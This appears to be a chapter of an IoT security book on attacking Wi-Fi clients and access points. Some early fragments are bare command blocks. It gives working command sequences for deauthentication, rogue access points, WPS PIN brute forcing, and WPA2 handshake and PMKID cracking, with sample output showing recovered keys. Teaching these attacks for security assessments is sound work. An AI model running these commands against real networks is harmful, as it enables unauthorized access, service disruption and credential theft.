["```\n# **apt-get install aircrack-ng**\n#**iwconfig**\ndocker0   no wireless extensions.\nlo        no wireless extensions.\n1 wlan0     IEEE 802.11  ESSID:off/any  \n          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   \n          Retry short  long limit:2   RTS thr:off   Fragment thr:off\n          Encryption key:off\n          Power Management:off  \neth0      no wireless extensions.\n```", "```\n# **ifconfig wlan0 down** \n# **airmon-ng check kill** \nKilling these processes:\nPID Name\n731 dhclient\n1357 wpa_supplicant\n```", "```\n# **airmon-ng start wlan0** \n**PHY    Interface     Driver        Chipset**\n**phy0   wlan0         ath9k_htc     Qualcomm Atheros Communications AR9271 802.11n**\n **(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)** \n **(mac80211 station mode vif disabled for [phy0]wlan0)**\n```", "```\n# **airodump-ng wlan0****mon**\nCH 11 ][ Elapsed: 36 s ][ 2019-09-19 10:47                                                                                                                        \nBSSID              PWR  Beacons    #Data, #/s   CH  MB   ENC CIPHER AUTH ESSID \n\n6F:20:92:11:06:10  -77       15        0    0   6  130  WPA2 CCMP   PSK  ZktT 2.4Ghz               \n6B:20:9F:10:15:6E  -85       14        0    0  11  130  WPA2 CCMP   PSK  73ad 2.4Ghz               \n7C:31:53:D0:A7:CF  -86       13        0    0  11  130  WPA2 CCMP   PSK  A7CF 2.4Ghz \n82:16:F9:6E:FB:56  -40       11       39    0   6   65  WPA2 CCMP   PSK  Secure Home              \nE5:51:61:A1:2F:78  -90        7        0    0   1  130  WPA2 CCMP   PSK  EE-cwwnsa \n```", "```\n# **airodump-ng wlan0mon --bssid  82:16:F9:6E:FB:56**\nCH 6 |[ Elapsed: 42 s ] [ 2019-09-19 10:49\nBSSID                   PWR Beacons  #Data, #/s   CH    MB  ENC  CIPHER AUTH ESSID\n82:16:F9:6E:FB:56       -37      24    267    2    6    65  WPA2 CCMP   PSK  Secure Home\nBSSID                   STATION           PWR   Rate     Lost     Frames   Probe\n82:16:F9:6E:FB:56       50:82:D5:DE:6F:45 -28   0e- 0e    904        274 \n```", "```\n# **aireplay-ng --deauth 0 -c 50:82:D5:DE:6F:45 -a 82:16:F9:6E:FB:56 wlan0mon**\n```", "```\n11:03:55   Waiting for beacon frame (BSSID:  82:16:F9:6E:FB:56) on channel 6\n11:03:56   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [ 0|64 ACKS]\n11:03:56   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [66|118 ACKS]\n11:03:57   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [62|121 ACKS]\n11:03:58   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [64|124 ACKS]\n11:03:58   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [62|110 ACKS]\n11:03:59   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [64|75 ACKS]\n11:03:59   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [63|64 ACKS]\n11:03:00   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [21|61 ACKS]\n11:03:00   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [ 0|67 ACKS]\n11:03:01   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [ 0|64 ACKS]\n11:03:02   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [ 0|61 ACKS]\n11:03:02   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [ 0|66 ACKS]\n11:03:03   Sending 64 directed DeAuth (code 7). STMAC [50:82:D5:DE:6F:45]  [ 0|65 ACKS]\n```", "```\n$ **sudo apt-get install libnl-3-dev libnl-genl-3-dev libssl-dev**\n$ **git clone** **https://github.com/wifiphisher/wifiphisher.git**\n$ **cd** **wifiphisher** **&&** **sudo python****3** **setup.py install**\n```", "```\n# 1 **wifiphisher -nD –essid my_essid -kB**\n[*] Starting Wifiphisher 1.4GIT ( https://wifiphisher.org ) at 2019-08-19 03:35\n[+] Timezone detected. Setting channel range to 1-13\n[+] Selecting wfphshr-wlan0 interface for the deauthentication attack\n[+] Selecting wlan0 interface for creating the rogue Access Point\n[+] Changing wlan0 MAC addr (BSSID) to 00:00:00:yy:yy:yy\n[+] Changing wlan0 MAC addr (BSSID) to 00:00:00:xx:xx:xx\n[+] Sending SIGKILL to wpa_supplicant\n[*] Cleared leases, started DHCP, set up iptables\n[+] Selecting OAuth Login Page template\n```", "```\n# 1 **reaver -i wlan0mon -b 0c:80:63:c5:1a:8a -vv**\nReaver v1.6.5 WiFi Protected Setup Attack Tool\nCopyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com> \n[+] Waiting for beacon from 0C:80:63:C5:1A:8A\n[+] Switching wlan0mon to channel 11\n[+] Received beacon from 0C:80:63:C5:1A:8A\n[+] Vendor: RalinkTe\n[+] Trying pin \"12345670\"\n[+] Sending authentication request\n[!] Found packet with bad FCS, skipping...…\n...\n[+] Received WSC NACK\n[+] Sending WSC NACK\n[!] WARNING: 2 Detected AP rate limiting, waiting 60 seconds before re-checking\n ...\n[+] 3 WPS PIN: ‘23456780’\n```", "```\n# **airmon-ng check kill**\n```", "```\n1 # **iwconfig**\n   eth0      no wireless extensions.\n   lo        no wireless extensions.\n  2 wlan0  IEEE 802.11  ESSID:off/any  \n          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   \n          Retry short  long limit:2   RTS thr:off   Fragment thr:off\n          Encryption key:off\n          Power Management:off\n\n3 # **airmon-ng start wlan0**\n```", "```\n# **airbase-ng -c 6 -e DIRECT-5x-BRAVIA -a BB:BB:BB:BB:BB:BB mon0**\n04:47:17  Created tap interface at0\n04:47:17  Trying to set MTU on at0 to 1500\n04:47:17  Access Point with BSSID BB:BB:BB:BB:BB:BB started.\n04:47:37 1 Client AA:AA:AA:AA:AA:AA associated (WPA2;CCMP) to ESSID: \"DIRECT-5x-BRAVIA\"\n```", "```` ``` # **airmon-ng check kill**  # **airodump-ng** **-c** **6** **--bssid 0C:0C:0C:0C:0C:0C wlan0mo -w dump** ```    Once we’ve captured frames for a couple of minutes, we start our brute-force attack to crack the key. We can do this quickly using Aircrack-ng:    ``` # **aircrack-ng -a2 -b 0C:0C:0C:0C:0C:0C -w list dump-01.cap**                               Aircrack-ng 1.5.2        [00:00:00] 4/1 keys tested (376.12 k/s)        Time left: 0 seconds                                     400.00%                             KEY FOUND! [ 24266642 ]          Master Key     : 7E 6D 03 12 31 1D 7D 7B 8C F1 0A 9E E5 B2 AB 0A                         46 5C 56 C8 AF 75 3E 06 D8 A2 68 9C 2A 2C 8E 3F          Transient Key  : 2E 51 30 CD D7 59 E5 35 09 00 CA 65 71 1C D0 4F                         21 06 C5 8E 1A 83 73 E0 06 8A 02 9C AA 71 33 AE                         73 93 EF D7 EF 4F 07 00 C0 23 83 49 76 00 14 08                         BF 66 77 55 D1 0B 15 52 EC 78 4F A1 05 49 CF AA        EAPOL HMAC     : F8 FD 17 C5 3B 4E AB C9 D5 F3 8E 4C 4B E2 4D 1A ```    We recover the PSK: `24266642`.    Note that some networks use more complex passwords, making this technique less feasible.    #### PMKID Attacks    In 2018, a Hashcat developer nicknamed atom discovered a new way to crack the WPA/WPA2 PSK and outlined it in the Hashcat forums. The novelty of this attack is that it’s clientless; the attacker can target the AP directly without having to capture the four-way handshake. In addition, it’s a more reliable method.    This new technique takes advantage of the *Robust Security Network (RSN)* PMKID field, an optional field normally found in the first EAPOL frame from the AP. The PMKID gets computed as follows:    ``` PMKID = HMAC-SHA1-128(PMK, “PMK Name” | MAC_AP | MAC_STA) ```    The PMKID uses the HMAC-SHA1 function with the PMK as a key. It encrypts the concatenation of a fixed string label, `\"PMK Name\"`; the AP’s MAC address; and the wireless station’s MAC address.    For this attack, you’ll need the following tools: Hcxdumptool, Hcxtools, and Hashcat. To install Hcxdumptool, use the following commands:    ``` $ **git clone https://github.com/ZerBea/hcxdumptool.git** $ **cd hcxdumptool && make &&** **sudo** **make install** ```    To install Hcxtools, you’ll first need to install `libcurl-dev` if it’s not already installed on your system:    ``` $ **sudo apt-get install libcurl4-gnutls-dev** ```    Then you can install Hcxtools with the following commands:    ``` $ **git clone https://github.com/ZerBea/hcxtools.git** $ **cd hcxtools && make &&** **sudo** **make install** ```    If you’re working on Kali, Hashcat should already be installed. On Debian-based distributions, the following command should do the trick:    ``` $**sudo** **apt install hashcat** ```    We first put our wireless interface in monitor mode. Follow the instructions in “Deauthentication and Denial-of-Service Attacks” on page 289 to do this.    Next, using `hcxdumptool`,we start capturing traffic and save it to a file:    ``` # **hcxdumptool -i wlan0mon –enable_status=31 -o sep.pcapng –filterlist_ap=whitelist.txt --filtermode=2** initialization... warning: wlan0mon is probably a monitor interface  start capturing (stop with ctrl+c) INTERFACE................: wlan0mon ERRORMAX.................: 100 errors FILTERLIST...............: 0 entries MAC CLIENT...............: a4a6a9a712d9 MAC ACCESS POINT.........: 000e2216e86d (incremented on every new client) EAPOL TIMEOUT............: 150000 REPLAYCOUNT..............: 65165 ANONCE...................: 6dabefcf17997a5c2f573a0d880004af6a246d1f566ebd04c3f1229db1ada39e ... [18:31:10 – 001] 84a06ec17ccc -> ffffffffff Guest [BEACON, SEQUENCE 2800, AP CHANNEL 11] ... [18:31:10 – 001] 84a06ec17ddd -> e80401cf4fff [FOUND PMKID CLIENT-LESS] [18:31:10 – 001] 84a06ec17eee -> e80401cf4aaa [AUTHENTICATION, OPEN SYSTEM, STATUS 0, SEQUENCE 2424] ... INFO: cha=1, rx=360700, rx(dropped)=106423, tx=9561, powned=21, err=0 INFO: cha=11, rx=361509, rx(dropped)=106618, tx=9580, powned=21, err=0 ```    Make sure you apply the `–filterlist_ap` argument with your target’s MAC address when using Hcxdumptool so you don’t accidentally crack the password for a network you have no permission to access. The `--filtermode` option will blacklist (`1`) or whitelist (`2`) the values in your list and then either avoid or target them. In our example, we listed these MAC addresses in the *whitelist.txt* file.    The output found a potentially vulnerable network, identified by the `[FOUND PMKID]` tag. Once you see this tag, you can stop capturing traffic. Keep in mind that it might take some time before you encounter it. Also, because the PMKID field is optional, not all existing APs will have one.    Now we need to convert the captured data, which includes the PMKID data in the *pcapng* format, to a format that Hashcat can recognize: Hashcat takes hashes as input. We can generate a hash from the data using `hcxpcaptool`:    ``` $ **hcxpcaptool -z out sep.pcapng** reading from sep.pcapng-2                                                 summary:                                         -------- file name....................: sep.pcapng-2 file type....................: pcapng 1.0 file hardware information....: x86_64 file os information..........: Linux 5.2.0-kali2-amd64 file application information.: hcxdumptool 5.1.4 network type.................: DLT_IEEE802_11_RADIO (127) endianness...................: little endian read errors..................: flawless packets inside...............: 171 skipped packets..............: 0 packets with GPS data........: 0 packets with FCS.............: 0 beacons (with ESSID inside)..: 22 probe requests...............: 9 probe responses..............: 6 association requests.........: 1 association responses........: 10 reassociation requests.......: 1 reassociation responses......: 1 authentications (OPEN SYSTEM): 47 authentications (BROADCOM)...: 46 authentications (APPLE)......: 1 EAPOL packets (total)........: 72 EAPOL packets (WPA2).........: 72 EAPOL PMKIDs (total).........: 19 EAPOL PMKIDs (WPA2)..........: 19 best handshakes..............: 3 (ap-less: 0) best PMKIDs..................: 8  8 PMKID(s) written in old hashcat format (<= 5.1.0) to out ```    This command creates a new file called *out* that contains data in the following format:    ``` 37edb542e507ba7b2a254d93b3c22fae*b4750e5a1387*6045bdede0e2*4b61746879 ```    This * delimited format contains the PMKID value, the AP’s MAC address, the wireless station’s MAC address, and the ESSID. Create a new entry for every PMKID network you identify.    Now use the Hashcat 16800 module to crack the vulnerable network’s password. The only thing missing is a wordlist containing potential passwords for the AP. We’ll use the classic *rockyou.txt* wordlist.    ``` **$ `cd /usr/share/wordlists/ && gunzip -d rockyou.txt.gz`** $ **hashcat -m16800 ./out /usr/share/wordlists/rockyou.txt** OpenCL Platform #1: NVIDIA Corporation ======================================  * Device #1: GeForce GTX 970M, 768/3072 MB allocatable, 10MCU OpenCL Platform #2: Intel(R) Corporation Rules: 1 ... .37edb542e507ba7b2a254d93b3c22fae*b4750e5a1387*6045bdede0e2*4b61746879: **purple123** 1 Session..........: hashcat Status...........: Cracked Hash.Type........: WPA-PMKID-PBKDF2 Hash.Target......: 37edb542e507ba7b2a254d93b3c22fae*b4750e5a1387*6045b...746879 Time.Started.....: Sat Nov 16 13:05:31 2019 (2 secs) Time.Estimated...: Sat Nov 16 13:05:33 2019 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........:   105.3 kH/s (11.80ms) @ Accel:256 Loops:32 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 387112/14344385 (2.70%) Rejected.........: 223272/387112 (57.68%) Restore.Point....: 0/14344385 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: 123456789 -> sunflower15 Hardware.Mon.#1..: Temp: 55c Util: 98% Core:1037MHz Mem:2505MHz Bus:16  Started: Sat Nov 16 13:05:26 2019 Stopped: Sat Nov 16 13:05:33  ```    The Hashcat tool manages to extract the password 1: `purple123`.    ### Cracking into WPA/WPA2 Enterprise to Capture Credentials    In this section, we provide an overview of attacks against WPA Enterprise. An actual exploitation of WPA Enterprise is outside the scope of this book, but we’ll briefly cover how such an attack works.    WPA Enterprise is a more complex mode than WPA Personal and is mainly used for business environments that require extra security. This mode includes an extra component, a *Remote Authentication Dial-In User Service (RADIUS)* server, and uses the 802.1x standard. In this standard, the four-way handshake occurs after a separate authentication process, the EAP. For this reason, the attacks on WPA Enterprise focus on breaking EAP.    EAP supports many different authentication methods, the most common of which are Protected-EAP (PEAP) and EAP-Tunneled-TLS (EAP-TTLS). A third method, EAP-TLS, is becoming more popular due to its security features. At the time of this writing, EAP-TLS remains a safe choice, because it requires security certificates on both sides of the wireless connection, providing a more resilient approach to connecting to an AP. But the administrative overhead of managing the server and the client certificates might deter most network administrators. The other two protocols perform certificate authentication to the server only, not to the client, allowing the clients to use credentials that are prone to interception.    Network connections in the WPA Enterprise mode involve three parties: the client, the AP, and the RADIUS authentication server. The attack described here will target the authentication server and the AP by attempting to extract the victim’s credential hashes for an offline brute-force attack. It should work against the PEAP and EAP-TTLS protocols.    First, we create a fake infrastructure containing a fake AP and a RADIUS server. This AP should mimic the legitimate one by operating with the same BSSID, ESSID, and channel. Next, because we’re targeting the clients rather than the AP, we’ll deauthenticate the AP’s clients. The clients will attempt to reconnect to their target AP by default, at which point our malicious AP will associate the victims to it. This way, we can capture their credentials. The captured credentials will be encrypted, as mandated by the protocol. Fortunately for us, the PEAP and EAP-TTLS protocols use the MS-CHAPv2 encryption algorithm, which uses the Data Encryption Standard (DES) under the hood and is easily cracked. Equipped with a list of captured encrypted credentials, we can launch an offline brute-force attack and recover the victim’s credentials.    ## A Testing Methodology    When performing a security assessment on Wi-Fi enabled systems, you could follow the methodology outlined here, which covers the attacks described in this chapter.    First, verify whether the device supports Wi-Fi Direct and its association techniques (PIN, PBC, or both). If so, it could be susceptible to PIN brute forcing or EvilDirect attacks.    Next, examine the device and its wireless capabilities. If the wireless device supports STA capabilities (which means itcan be used as either an AP or a client), it might be vulnerable to association attacks. Check if the client connects automatically to previously connected networks. If it does, it could be vulnerable to the Known Beacons attack. Verify that the client isn’t arbitrarily sending probes for previously connected networks. If it is, it could be vulnerable to a KARMA attack.    Identify whether the device has support for any third-party Wi-Fi utilities, such as custom software used to set up Wi-Fi automatically. These utilities could have insecure settings enabled by default due to negligence. Study the device’s activities. Are there any critical operations happening over Wi-Fi? If so, it might be possible to cause a denial of service by jamming the device. Also, in cases when the wireless device supports AP capabilities, it could be vulnerable to improper authentication.    Then search for potential hardcoded keys. Devices configured to support WPA2 Personal might come with a hardcoded key. This is a common pitfall that could mean an easy win for you. On enterprise networks that use WPA Enterprise, identify which authentication method the network is employing. Networks using PEAP and EAP-TTLS could be susceptible to having their client’s credentials compromised. Enterprise networks should use EAP-TLS instead.    ## Conclusion    Recent advances in technologies like Wi-Fi have greatly contributed to the IoT ecosystem, allowing people and devices to be even more connected than ever in the past. Most people expect a standard degree of connectivity wherever they go, and organizations regularly rely on Wi-Fi and other wireless protocols to increase their productivity.    In this chapter, we demonstrated Wi-Fi attacks against clients and APs with off-the-shelf tools, showing the large attack surface that medium-range radio protocols unavoidably expose. At this point, you should have a good understanding of various attacks against Wi-Fi networks, ranging from signal jamming and network disruption to association attacks like the KARMA and Known Beacons attacks. We detailed some key features of Wi-Fi Direct and how to compromise them using PIN brute forcing and the EvilDirect attack. Then we went over the WPA2 Personal and Enterprise security protocols and identified their most critical issues. Consider this chapter a baseline for your Wi-Fi network assessments. ````"]